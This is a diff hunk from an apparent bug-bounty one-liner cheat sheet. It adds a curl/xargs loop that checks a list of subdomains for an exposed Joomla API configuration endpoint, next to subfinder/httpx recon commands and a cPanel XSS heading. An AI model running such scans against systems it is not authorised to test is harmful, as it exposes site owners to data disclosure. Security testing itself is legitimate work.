@@ -191,7 +191,10 @@ katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew e
 ```
 subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
 ```
-
+OR You Can Use:
+```
+cat subdomains.txt | xargs -I {} curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "http://{}/api/index.php/v1/config/application?public=true" | grep "200 "
+```
 ────────────────────────────────────────────────────────────────────────
 
 # cPanel CVE-2023-29489 XSS One-Liner
